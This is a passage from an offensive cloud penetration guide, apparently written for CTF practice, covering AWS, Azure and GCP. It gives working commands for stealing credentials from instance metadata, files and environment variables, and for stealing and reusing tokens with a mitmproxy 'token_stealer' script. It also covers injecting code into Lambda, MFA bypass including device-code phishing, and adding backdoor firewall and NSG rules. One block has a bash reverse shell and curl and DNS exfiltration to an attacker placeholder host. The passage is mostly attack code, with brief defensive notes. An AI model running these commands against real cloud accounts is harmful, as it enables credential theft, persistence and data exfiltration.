az role assignment list --scope <resource-id>
```

**GCP Enumeration:**

```bash
# Authenticate
gcloud auth login

# Get current account
gcloud config list

# List IAM policies
gcloud projects get-iam-policy <project-id>

# Service account enumeration
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy <sa-email>

# Check permissions
gcloud projects get-iam-policy <project-id> \
  --flatten="bindings[].members" \
  --filter="bindings.members:<account>"
```

### Automated Policy Analysis Tools

**ScoutSuite** (multi-cloud security auditing):

```bash
pip3 install scoutsuite

# AWS scan
scout aws --profile <profile-name>

# Azure scan
scout azure --cli

# GCP scan
scout gcp --project-id <project-id>

# Results in HTML report: scoutsuite-report/scoutsuite_results_*.html
```

**Prowler** (AWS-focused):

```bash
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Full scan
./prowler -M csv html

# Scan specific checks
./prowler -c check310  # IAM policies attached to users
./prowler -c check311  # IAM policies allow full administrative privileges
```

**PMapper** (AWS IAM privilege mapping):

```bash
pip3 install principalmapper

# Build graph of IAM relationships
pmapper graph create

# Query privilege escalation paths
pmapper query "who can do s3:GetObject on *"
pmapper escalation --principal <username>
```

## Credential Harvesting

### Instance Metadata Service (IMDS) Exploitation

**AWS IMDS v1 (vulnerable to SSRF):**

```bash
# From compromised instance or SSRF vulnerability
curl http://169.254.169.254/latest/meta-data/

# Enumerate IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve temporary credentials
ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Output contains AccessKeyId, SecretAccessKey, Token
```

**AWS IMDS v2 (requires token):**

```bash
# Request token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

**Azure IMDS:**

```bash
# Retrieve access token
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true

# Use token in API requests
curl -H "Authorization: Bearer <token>" \
  https://management.azure.com/subscriptions?api-version=2020-01-01
```

**GCP Metadata:**

```bash
# Get access token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# List scopes
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
  -H "Metadata-Flavor: Google"
```

### User Data and Environment Variables

**Check user-data scripts:**

```bash
# AWS - from instance
curl http://169.254.169.254/latest/user-data

# Common locations for credentials in user-data
# - Hardcoded AWS keys
# - Database connection strings
# - API tokens
```

**Environment variable harvesting:**

```bash
# Linux
env | grep -i 'key\|secret\|token\|password\|aws\|azure\|gcp'
cat /proc/*/environ | strings | grep -i 'key\|secret'

# Search shell history
cat ~/.bash_history | grep -i 'aws\|export\|key'
cat ~/.aws/config
cat ~/.aws/credentials

# Check running processes
ps auxe | grep -i 'key\|secret\|token'
```

### Storage Enumeration

**AWS S3 bucket reconnaissance:**

```bash
# List buckets
aws s3 ls

# List bucket contents recursively
aws s3 ls s3://bucket-name --recursive

# Download entire bucket
aws s3 sync s3://bucket-name ./local-dir/

# Common credential-containing files:
# - .aws/credentials
# - .env
# - config.json
# - secrets.yaml
# - *.pem, *.key
```

**Search downloaded content:**

```bash
# Grep for credential patterns
grep -r "AKIA[0-9A-Z]{16}" ./  # AWS access keys
grep -r "BEGIN RSA PRIVATE KEY" ./
grep -r "password\|passwd\|pwd" . --include="*.json" --include="*.yaml" --include="*.conf"

# Use truffleHog for secrets detection
trufflehog filesystem ./local-dir/ --json
```

### Application Configuration Files

**Common credential locations:**

```bash
# Web applications
/var/www/html/config.php
/var/www/html/.env
/opt/app/application.properties

# Containers
docker inspect <container-id>  # Check environment variables
docker logs <container-id> | grep -i key

# Kubernetes secrets (if you have kubectl access)
kubectl get secrets -A
kubectl get secret <secret-name> -o yaml
echo "<base64-data>" | base64 -d
```

### Git Repository Exposure

**Search commit history:**

```bash
# Clone repository
git clone <repo-url>

# Search all commits for credentials
git log -p | grep -i "password\|key\|secret"

# Use git-secrets scanner
git secrets --scan-history

# Use truffleHog
trufflehog git <repo-url> --only-verified
```

## Token Theft and Reuse

### AWS Security Token Service (STS) Tokens

**Token structure:** AWS temporary credentials consist of:

- `AccessKeyId`: Begins with `ASIA` (vs permanent keys: `AKIA`)
- `SecretAccessKey`: 40-character string
- `SessionToken`: Long base64-encoded string

**Token theft from compromised instance:**

```bash
# Extract from IMDS (shown in credential harvesting)
# Or from environment variables
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN

# Export on attacker machine
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Verify access
aws sts get-caller-identity
```

**Token lifetime and renewal:**

```bash
# Check token expiration
aws sts get-session-token

# Tokens typically valid 1-12 hours
# [Inference] If the role's trust policy permits, you may be able to request new tokens before expiration by re-assuming the role, but this depends on having continued access to the assuming principal
```

### Azure Access Tokens

**Token types:**

- **Access tokens**: JWT format, used for API authentication
- **Refresh tokens**: Used to obtain new access tokens

**Extract tokens from Azure CLI:**

```bash
# Tokens stored in ~/.azure/
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json

# Get current token
az account get-access-token

# Use token with REST API
curl -H "Authorization: Bearer <token>" \
  https://management.azure.com/subscriptions?api-version=2020-01-01
```

**Token analysis:**

```bash
# Decode JWT (does not verify signature)
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Check expiration (exp claim)
# Check scope (scp claim)
# Check audience (aud claim)
```

**Token refresh:**

```bash
# [Unverified] - Azure refresh token mechanism
# If you capture a refresh token, you may be able to request new access tokens
# This depends on the refresh token not being revoked and remaining within its lifetime

# Using Azure AD authentication library
# Implementation varies by library and authentication flow
```

### GCP Access Tokens

**Extract from gcloud:**

```bash
# Get access token
gcloud auth print-access-token

# Get token with specific scopes
gcloud auth application-default print-access-token

# Configuration location
cat ~/.config/gcloud/credentials.db  # SQLite database
cat ~/.config/gcloud/access_tokens.db
```

**Use stolen tokens:**

```bash
# Set token for gcloud
gcloud config set auth/access_token_file <token-file>

# Or use directly with curl
curl -H "Authorization: Bearer <token>" \
  https://cloudresourcemanager.googleapis.com/v1/projects
```

### Session Token Extraction from Web Applications

**Browser storage inspection:**

```javascript
// In browser console
console.log(localStorage)
console.log(sessionStorage)
console.log(document.cookie)

// Look for JWT tokens in:
// - Authorization headers in network tab
// - Local/session storage keys like "token", "auth", "session"
// - Cookies with names containing "session", "auth", "token"
```

**Intercept with proxy:**

```bash
# Configure Burp Suite or mitmproxy
# Intercept API requests
# Extract Authorization headers or session tokens

# Example mitmproxy filter
mitmdump -s token_stealer.py

# token_stealer.py
def response(flow):
    if "Authorization" in flow.request.headers:
        print(flow.request.headers["Authorization"])
```

### Credential Exfiltration via Compromised Lambda/Functions

**AWS Lambda environment:**

```python
import os
import boto3

# Lambda functions execute with IAM role credentials
# These are available via environment variables

def lambda_handler(event, context):
    # Credentials automatically available to boto3
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Exfiltrate via various methods:
    # - HTTP callback to attacker server
    # - S3 upload to public bucket
    # - CloudWatch Logs (if you have access to read them)
    
    return identity
```

**Inject malicious code:**

```bash
# If you can update function code
zip payload.zip lambda_function.py

aws lambda update-function-code \
  --function-name <function-name> \
  --zip-file fileb://payload.zip

# Invoke function
aws lambda invoke --function-name <function-name> output.txt
cat output.txt
```

## MFA Bypass Techniques

### Important Context

[Unverified] The specific effectiveness of MFA bypass techniques varies significantly based on implementation details, security controls, and organizational policies. The techniques below describe known attack patterns, but success depends on specific configurations.

### Credential Stuffing Against Non-MFA Endpoints

**Concept:** Some AWS/Azure/GCP services or API endpoints may not enforce MFA even when it's enabled for console access.

**AWS console vs programmatic access:**

```bash
# MFA may be required for console login
# But not enforced for API access with access keys

# If you obtain access keys (not tied to MFA)
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...

aws s3 ls  # May work even if console requires MFA
```

**Test programmatic access:**

```bash
# AWS
aws sts get-caller-identity

# Azure
az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>

# GCP
gcloud auth activate-service-account --key-file=<json-key>
```

### Session Token Reuse

**Obtain authenticated session before MFA prompt:** [Inference] If an application issues a session token before requiring MFA for certain actions, that token might be reusable for other operations.

```bash
# Capture session cookie/token during initial authentication
# Before MFA challenge appears

# Test if token works for privileged operations
# Example: API endpoints, administrative functions

curl -H "Cookie: session=<captured-token>" \
  https://app.example.com/admin/users
```

### Exploiting MFA Enrollment Process

**Incomplete enrollment:** [Inference] If MFA enrollment is optional or has a grace period, accounts may be accessible without MFA.

```bash
# Enumerate users
aws iam list-users

# Check MFA status
aws iam list-mfa-devices --user-name <username>

# Empty response indicates no MFA enrolled
```

**Self-service enrollment exploitation:**

```bash
# If you compromise credentials during enrollment period
# Before MFA is enforced

# Check if you can disable MFA requirement
aws iam delete-user-policy --user-name <username> --policy-name EnforceMFA

# Or if you can modify account settings via API
```

### Pass-the-Token Attacks

**STS AssumeRole without MFA:**

```bash
# Some roles may not require MFA in their trust policy
# Even if the assuming principal has MFA enabled

# Check role trust policy
aws iam get-role --role-name <RoleName>

# Look for absence of MFA condition:
# "Condition": {
#   "Bool": { "aws:MultiFactorAuthPresent": "true" }
# }

# If no MFA condition, assume role without MFA
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT:role/RoleName \
  --role-session-name exploit
```

### Azure Conditional Access Bypass

**Trusted location bypass:** [Inference] Azure Conditional Access policies may exempt certain IP ranges or locations from MFA requirements.

```bash
# If policies check for:
# - Corporate VPN IP ranges
# - Specific geographic locations
# - Compliant device status

# Attempt access from different locations/IPs
# Test with various User-Agent strings to simulate compliant devices
```

**Legacy authentication protocols:** [Unverified] Some legacy protocols (IMAP, POP3, SMTP) may not support modern authentication and could bypass MFA.

```bash
# Test legacy protocol access
# Example: SMTP AUTH
curl --url 'smtp://smtp.office365.com:587' \
  --mail-from 'user@domain.com' \
  --mail-rcpt 'target@domain.com' \
  --user 'user@domain.com:password'
```

### Session Persistence Exploitation

**Long-lived session tokens:** [Inference] Applications may issue long-lived tokens after MFA verification that remain valid even if MFA is subsequently disabled.

```bash
# Authenticate with MFA
# Capture session token
# Wait or trigger MFA disable/reset
# Attempt to use old session token

# Testing approach varies by platform
```

### OAuth Token Theft

**Device code phishing:** [Inference] Device code flow allows authentication on a separate device, which can be exploited via social engineering.

```bash
# Initiate device code flow
az login --use-device-code

# Output provides URL and code
# Social engineering: trick user to enter code at URL

# Attacker gains access without directly handling password/MFA
```

### Proxy Token from Trusted Service

**Service principals and managed identities:**

```bash
# Azure Managed Identity doesn't require MFA
# If you compromise a resource with managed identity

curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true

# This bypasses user MFA requirements
```

**AWS IAM roles for EC2:**

```bash
# EC2 instance profiles bypass MFA
# Compromise instance -> get role credentials -> no MFA needed

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Important MFA Bypass Notes

[Unverified] Effectiveness of bypass techniques depends heavily on:

- Specific implementation of MFA enforcement
- Conditional access policies
- Service vs. user authentication differences
- Legacy protocol support status
- Session management configurations

**Detection risk:** MFA bypass attempts may generate security alerts including:

- Unusual login locations
- Legacy protocol usage
- Failed MFA challenges
- Concurrent sessions from different locations

**Defensive recommendations relevant to CTF:**

- Check for inconsistent MFA enforcement across APIs
- Identify legacy authentication methods still enabled
- Review service principal and managed identity permissions
- Examine session token lifetime policies

---

# Cloud Network Penetration

## VPC/VNet Enumeration

### AWS VPC Enumeration

**Primary Tools:**

- `aws-cli` - Official AWS command-line interface
- `ScoutSuite` - Multi-cloud security auditing tool
- `Prowler` - AWS security assessment tool
- `Pacu` - AWS exploitation framework

**Core Enumeration Commands:**

```bash
# List all VPCs in current region
aws ec2 describe-vpcs

# Get VPC details with CIDR blocks
aws ec2 describe-vpcs --vpc-ids vpc-xxxxx --query 'Vpcs[*].[VpcId,CidrBlock,IsDefault]'

# Enumerate subnets in a VPC
aws ec2 describe-subnets --filters "Name=vpc-id,Values=vpc-xxxxx"

# List route tables and associations
aws ec2 describe-route-tables --filters "Name=vpc-id,Values=vpc-xxxxx"

# Discover internet gateways
aws ec2 describe-internet-gateways --filters "Name=attachment.vpc-id,Values=vpc-xxxxx"

# Find NAT gateways
aws ec2 describe-nat-gateways --filter "Name=vpc-id,Values=vpc-xxxxx"

# Enumerate VPC peering connections
aws ec2 describe-vpc-peering-connections

# List VPC endpoints (for AWS services)
aws ec2 describe-vpc-endpoints --filters "Name=vpc-id,Values=vpc-xxxxx"

# Enumerate network interfaces
aws ec2 describe-network-interfaces --filters "Name=vpc-id,Values=vpc-xxxxx"
```

**Advanced Enumeration Techniques:**

```bash
# Identify public vs private subnets (public have routes to IGW)
aws ec2 describe-route-tables --query 'RouteTables[*].[RouteTableId,Routes[?GatewayId!=`local`].GatewayId]'

# Find all available CIDR ranges
aws ec2 get-associated-ipv6-pool-cidrs --pool-id pool-xxxxx

# Enumerate VPC flow logs status
aws ec2 describe-flow-logs --filter "Name=resource-id,Values=vpc-xxxxx"

# Check DNS settings
aws ec2 describe-vpc-attribute --vpc-id vpc-xxxxx --attribute enableDnsHostnames
aws ec2 describe-vpc-attribute --vpc-id vpc-xxxxx --attribute enableDnsSupport
```

**Using ScoutSuite for Automated VPC Enumeration:**

```bash
# Install ScoutSuite
pip3 install scoutsuite

# Run full AWS audit (includes VPC analysis)
scout aws --profile <profile_name> --report-dir ./scout-report

# Results include:
# - VPC configuration issues
# - Subnet exposure analysis
# - Flow log configuration
# - Network ACL and security group findings
```

**Using Pacu for Offensive VPC Enumeration:**

```bash
# Start Pacu
pacu

# Set AWS keys
set_keys

# Run VPC enumeration module
run ec2__enum

# Specific VPC data gathering
run vpc__enum_lateral_movement
```

### Azure VNet Enumeration

**Primary Tools:**

- `az-cli` - Azure command-line interface
- `PowerShell with Az module`
- `ScoutSuite` - Works for Azure
- `MicroBurst` - Azure security assessment scripts

**Core Enumeration Commands:**

```bash
# List all virtual networks
az network vnet list --output table

# Get specific VNet details
az network vnet show --resource-group <rg_name> --name <vnet_name>

# List subnets in a VNet
az network vnet subnet list --resource-group <rg_name> --vnet-name <vnet_name> --output table

# Enumerate network security groups
az network nsg list --output table

# Check NSG rules
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> --output table

# List route tables
az network route-table list --output table

# Enumerate VNet peerings
az network vnet peering list --resource-group <rg_name> --vnet-name <vnet_name>

# List network interfaces
az network nic list --output table

# Check network watcher status
az network watcher list
```

**PowerShell Enumeration:**

```powershell
# Connect to Azure
Connect-AzAccount

# Get all VNets
Get-AzVirtualNetwork

# Detailed VNet information
Get-AzVirtualNetwork -ResourceGroupName <rg_name> -Name <vnet_name> | Select-Object *

# Enumerate subnets with details
Get-AzVirtualNetworkSubnetConfig -VirtualNetwork (Get-AzVirtualNetwork -Name <vnet_name>)

# Get NSGs with rules
Get-AzNetworkSecurityGroup | Select-Object Name, ResourceGroupName, Location
Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup (Get-AzNetworkSecurityGroup -Name <nsg_name>)

# Check VNet peering connections
Get-AzVirtualNetworkPeering -VirtualNetworkName <vnet_name> -ResourceGroupName <rg_name>
```

**Using MicroBurst for Azure Enumeration:**

```powershell
# Import MicroBurst
Import-Module MicroBurst.psm1

# Enumerate network resources
Get-AzureNetworkInfo -Verbose

# Extract VNet configurations
Get-AzVirtualNetworkConfig -ExportToFile vnet-config.txt
```

### GCP VPC Enumeration

**Primary Tools:**

- `gcloud` - Google Cloud CLI
- `gcpbucketbrute` - GCP-specific enumeration
- `ScoutSuite` - Supports GCP

**Core Enumeration Commands:**

```bash
# List all VPC networks
gcloud compute networks list

# Get detailed VPC information
gcloud compute networks describe <vpc_name>

# List subnets
gcloud compute networks subnets list

# Subnet details with IP ranges
gcloud compute networks subnets describe <subnet_name> --region=<region>

# List firewall rules
gcloud compute firewall-rules list

# Get specific firewall rule details
gcloud compute firewall-rules describe <rule_name>

# Enumerate routes
gcloud compute routes list

# List VPC peering connections
gcloud compute networks peerings list --network=<vpc_name>

# Show network interfaces
gcloud compute instances list --format="table(name, networkInterfaces[].networkIP)"

# List forwarding rules (load balancers)
gcloud compute forwarding-rules list
```

**Advanced GCP Network Discovery:**

```bash
# Find all external IPs
gcloud compute addresses list --filter="addressType=EXTERNAL"

# Enumerate Cloud NAT configurations
gcloud compute routers list
gcloud compute routers nats list --router=<router_name> --region=<region>

# Check VPC Service Controls
gcloud access-context-manager perimeters list

# List interconnect attachments
gcloud compute interconnects attachments list
```

### Cross-Platform Enumeration Strategies

**Identifying Network Topology:**

1. **Map CIDR blocks and IP ranges** - Understand address space allocation
2. **Identify public vs private subnets** - Look for routes to internet gateways
3. **Document inter-VPC/VNet connectivity** - Peering, VPN, transit gateways
4. **Locate network egress points** - NAT gateways, proxy servers, load balancers
5. **Enumerate service endpoints** - Direct connections to cloud services bypassing public internet

**Key Indicators of Misconfiguration:**

- Overly broad CIDR blocks (e.g., /16 when /24 would suffice)
- Default VPC/VNet usage in production
- Missing flow logs or network monitoring
- Unnecessary VPC peering connections
- Public subnets with sensitive workloads

---

## Security Group Misconfiguration

### AWS Security Group Exploitation

**Understanding Security Groups:**

- Stateful firewalls at the instance level
- Applied to ENIs (Elastic Network Interfaces)
- Default deny inbound, allow all outbound
- Rules specify protocol, port range, and source/destination

**Enumeration Commands:**

```bash
# List all security groups
aws ec2 describe-security-groups

# Get specific security group rules
aws ec2 describe-security-groups --group-ids sg-xxxxx

# Find security groups with specific rules (e.g., 0.0.0.0/0 on port 22)
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" \
  --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions[?FromPort==`22`]]'

# Identify instances associated with a security group
aws ec2 describe-instances --filters "Name=instance.group-id,Values=sg-xxxxx"

# Find security groups allowing 0.0.0.0/0
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'
```

**Common Misconfigurations:**

1. **Unrestricted SSH/RDP Access:**

```bash
# Find SSH open to world
aws ec2 describe-security-groups --query \
  'SecurityGroups[?IpPermissions[?FromPort==`22` && IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'

# Find RDP open to world (port 3389)
aws ec2 describe-security-groups --query \
  'SecurityGroups[?IpPermissions[?FromPort==`3389` && IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'
```

2. **Database Ports Exposed:**

```bash
# MySQL (3306), PostgreSQL (5432), MongoDB (27017), Redis (6379)
aws ec2 describe-security-groups --query \
  'SecurityGroups[?IpPermissions[?(FromPort==`3306` || FromPort==`5432` || FromPort==`27017` || FromPort==`6379`) && IpRanges[?CidrIp==`0.0.0.0/0`]]]'
```

3. **All Ports Open:**

```bash
# Find rules with -1 protocol (all traffic)
aws ec2 describe-security-groups --query \
  'SecurityGroups[?IpPermissions[?IpProtocol==`-1` && IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'
```

**Exploitation Techniques:**

**1. Port Scanning Through Security Groups:**

```bash
# Use nmap against discovered open ports
nmap -Pn -p 22,80,443,3389 <target_ip>

# Service version detection on open ports
nmap -sV -p <discovered_ports> <target_ip>

# Aggressive scan for vulnerable services
nmap -A -p- <target_ip>
```

**2. Leveraging Overly Permissive Egress Rules:**

```bash
# If you compromise an instance, test outbound connectivity
# Most security groups allow all egress by default

# Establish reverse shell (if you have code execution)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Exfiltrate data via HTTP
curl -X POST -d @sensitive_file.txt http://<attacker_ip>:8000/

# DNS exfiltration (rarely blocked)
for line in $(cat data.txt); do dig $line.<attacker_domain>; done
```

**3. Security Group Chaining:** [Inference] Security groups can reference other security groups as sources. If you compromise one instance, you may gain access to resources that trust that instance's security group.

```bash
# Identify security group chains
aws ec2 describe-security-groups --query \
  'SecurityGroups[?IpPermissions[?UserIdGroupPairs]].[GroupId,IpPermissions[?UserIdGroupPairs].UserIdGroupPairs]'

# From compromised instance, attempt connections to resources in referenced groups
```

**4. Privilege Escalation via Security Group Modification:**

```bash
# If you have ec2:AuthorizeSecurityGroupIngress permissions
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 22 \
  --cidr 0.0.0.0/0

# Add your IP to existing security group
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp \
  --port 22 \
  --cidr <your_ip>/32

# Modify security group to allow all traffic from your IP
aws ec2 authorize-security-group-ingress \
  --group-id sg-xxxxx \
  --ip-permissions IpProtocol=-1,IpRanges='[{CidrIp=<your_ip>/32}]'
```

### Azure Network Security Group (NSG) Exploitation

**Understanding Azure NSGs:**

- Can be applied at subnet or NIC level
- Stateful firewall rules
- Priority-based (100-4096, lower = higher priority)
- Default rules cannot be deleted (DenyAllInbound, AllowVnetInbound, etc.)

**Enumeration Commands:**

```bash
# List all NSGs
az network nsg list --output table

# Get NSG rules with priorities
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> --output table --query "[].{Name:name, Priority:priority, Direction:direction, Access:access, Protocol:protocol, SourcePort:sourcePortRange, DestPort:destinationPortRange, Source:sourceAddressPrefix, Dest:destinationAddressPrefix}"

# Find NSGs with specific ports open
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> --query "[?destinationPortRange=='22' || destinationPortRange=='*']"

# Check NSG associations
az network nsg show --resource-group <rg_name> --name <nsg_name> --query "{Subnets:subnets[].id, NICs:networkInterfaces[].id}"
```

**PowerShell Enumeration:**

```powershell
# Get all NSGs with detailed rules
Get-AzNetworkSecurityGroup | ForEach-Object {
    $nsg = $_
    Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg | 
    Select-Object @{N='NSG';E={$nsg.Name}}, Name, Priority, Direction, Access, Protocol, 
    SourcePortRange, DestinationPortRange, SourceAddressPrefix, DestinationAddressPrefix
}

# Find rules allowing traffic from Internet
Get-AzNetworkSecurityGroup | ForEach-Object {
    Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $_ | 
    Where-Object {$_.SourceAddressPrefix -eq '*' -or $_.SourceAddressPrefix -eq 'Internet'}
}

# Check effective NSG rules on a NIC
Get-AzEffectiveNetworkSecurityGroup -NetworkInterfaceName <nic_name> -ResourceGroupName <rg_name>
```

**Common Misconfigurations:**

1. **Wildcard Sources with High Priority:**

```bash
# Find rules with priority < 1000 allowing from anywhere
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
  --query "[?priority<1000 && sourceAddressPrefix=='*'].{Name:name, Port:destinationPortRange, Priority:priority}"
```

2. **Any-Any Rules:**

```bash
# Rules allowing all protocols from anywhere to anywhere
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
  --query "[?protocol=='*' && sourceAddressPrefix=='*' && destinationAddressPrefix=='*']"
```

3. **Management Port Exposure:**

```bash
# Check for exposed WinRM (5985, 5986), SSH (22), RDP (3389)
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
  --query "[?destinationPortRange=='22' || destinationPortRange=='3389' || destinationPortRange=='5985' || destinationPortRange=='5986']"
```

**Exploitation Techniques:**

**1. NSG Rule Priority Manipulation:** [Inference] If you have `Microsoft.Network/networkSecurityGroups/securityRules/write` permission:

```bash
# Add high-priority allow rule
az network nsg rule create \
  --resource-group <rg_name> \
  --nsg-name <nsg_name> \
  --name AllowMyIP \
  --priority 100 \
  --source-address-prefixes <your_ip>/32 \
  --destination-port-ranges '*' \
  --access Allow \
  --protocol '*'

# Using PowerShell
Add-AzNetworkSecurityRuleConfig -Name "BackdoorRule" -NetworkSecurityGroup $nsg `
  -Priority 100 -Direction Inbound -Access Allow -Protocol * `
  -SourceAddressPrefix "<your_ip>/32" -SourcePortRange * `
  -DestinationAddressPrefix * -DestinationPortRange *
Set-AzNetworkSecurityGroup -NetworkSecurityGroup $nsg
```

**2. Service Tag Abuse:** Azure NSGs support service tags like `Internet`, `VirtualNetwork`, `AzureLoadBalancer`. [Inference] Misuse of these can create unintended access.

```bash
# Check for overly broad service tag usage
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
  --query "[?sourceAddressPrefix=='Internet' || sourceAddressPrefix=='*']"
```

**3. Application Security Group (ASG) Exploitation:** [Inference] ASGs group NICs logically. If an NSG rule references an ASG, compromising any VM in that ASG grants access to other resources.

```bash
# List ASGs
az network asg list --output table

# Find NSG rules using ASGs
az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
  --query "[?sourceApplicationSecurityGroups || destinationApplicationSecurityGroups]"
```

### GCP Firewall Rule Exploitation

**Understanding GCP Firewall Rules:**

- Applied at VPC network level
- Stateful connections
- Priority-based (0-65535, lower = higher priority)
- Targets can be tags, service accounts, or all instances

**Enumeration Commands:**

```bash
# List all firewall rules
gcloud compute firewall-rules list

# Get detailed rule information
gcloud compute firewall-rules describe <rule_name>

# Find rules allowing from anywhere (0.0.0.0/0)
gcloud compute firewall-rules list --format="table(name,sourceRanges.list():label=SOURCE_RANGES,allowed[].map().firewall_rule().list():label=ALLOW,targetTags.list():label=TARGET_TAGS)" --filter="sourceRanges:0.0.0.0/0"

# Find SSH rules
gcloud compute firewall-rules list --filter="allowed.ports:22"

# Check rules by priority
gcloud compute firewall-rules list --format="table(name,priority,direction,disabled)" --sort-by=priority
```

**Common Misconfigurations:**

1. **Default-Allow Rules Still Active:**

```bash
# Check for default rules (created with VPC)
gcloud compute firewall-rules list --filter="name~^default-"

# Default rules often include:
# - default-allow-icmp (ICMP from anywhere)
# - default-allow-internal (all protocols within VPC)
# - default-allow-rdp (RDP from anywhere)
# - default-allow-ssh (SSH from anywhere)
```

2. **Overly Permissive Source Ranges:**

```bash
# Find rules with 0.0.0.0/0 source
gcloud compute firewall-rules list --format="table(name,sourceRanges,allowed)" \
  --filter="sourceRanges:0.0.0.0/0 AND direction=INGRESS"
```

3. **Network Tag Misuse:**

```bash
# List rules by target tags
gcloud compute firewall-rules list --format="table(name,targetTags.list(),allowed)"

# Check which instances have specific tags
gcloud compute instances list --format="table(name,tags.items.list())"
```

**Exploitation Techniques:**

**1. Instance Tag Manipulation:** [Inference] If you have `compute.instances.setTags` permission:

```bash
# Add a tag to your compromised instance that matches permissive firewall rules
gcloud compute instances add-tags <instance_name> \
  --tags <target_tag> \
  --zone <zone>

# Example: Adding 'web-server' tag if firewall allows HTTP/HTTPS to 'web-server' tag
gcloud compute instances add-tags my-instance --tags web-server --zone us-central1-a
```

**2. Creating Backdoor Firewall Rules:** [Inference] If you have `compute.firewalls.create` permission:

```bash
# Create high-priority rule allowing your IP
gcloud compute firewall-rules create backdoor-rule \
  --network <vpc_name> \
  --priority 1 \
  --direction INGRESS \
  --action ALLOW \
  --rules tcp:1-65535,udp:1-65535,icmp \
  --source-ranges <your_ip>/32

# Create rule targeting specific instances by tag
gcloud compute firewall-rules create access-db \
  --network <vpc_name> \
  --priority 100 \
  --direction INGRESS \
  --action ALLOW \
  --rules tcp:5432 \
  --source-ranges <your_ip>/32 \
  --target-tags database
```

**3. Firewall Rule Modification:**

```bash
# Update existing rule (requires compute.firewalls.update)
gcloud compute firewall-rules update <rule_name> \
  --source-ranges <your_ip>/32,<existing_ranges>

# Disable a deny rule temporarily
gcloud compute firewall-rules update <deny_rule_name> --disabled
```

**4. Hierarchical Firewall Policy Bypass:** [Inference] GCP supports hierarchical firewall policies at organization/folder level. VPC-level rules can sometimes bypass these if not properly configured.

```bash
# Check hierarchical policies (requires org-level access)
gcloud compute firewall-policies list --organization <org_id>

# If VPC rules are processed before hierarchical policies, create VPC-level allow rules
```

### Detection and Defense Considerations

**Anomalous Security Group Changes:**

- AWS CloudTrail events: `AuthorizeSecurityGroupIngress`, `RevokeSecurityGroupIngress`
- Azure Activity Log: `Microsoft.Network/networkSecurityGroups/securityRules/write`
- GCP Cloud Audit Logs: `v1.compute.firewalls.insert`, `v1.compute.firewalls.patch`

**Automated Detection Tools:**

- **Prowler** (AWS): `check22`, `check21` for security group auditing
- **ScoutSuite**: Flags overly permissive rules across all platforms
- **CloudMapper** (AWS): Visualizes security group relationships
- **Cloud Custodian**: Policy-as-code enforcement for security groups

---

## Network ACL Bypass

### AWS Network ACL (NACL) Analysis

**Understanding NACLs:**

- Stateless firewalls at the subnet level
- Separate inbound and outbound rules
- Evaluated by rule number (lowest first)
- Default NACL allows all traffic; custom NACLs deny all by default
- Must explicitly allow both request and response traffic

**Enumeration Commands:**

```bash
# List all NACLs
aws ec2 describe-network-acls

# Get NACL for specific subnet
aws ec2 describe-network-acls --filters "Name=association.subnet-id,Values=subnet-xxxxx"

# View NACL rules in order
aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
  --query 'NetworkAcls[*].Entries' --output table

# Find custom NACLs (non-default)
aws ec2 describe-network-acls --filters "Name=default,Values=false"

# Check NACL associations
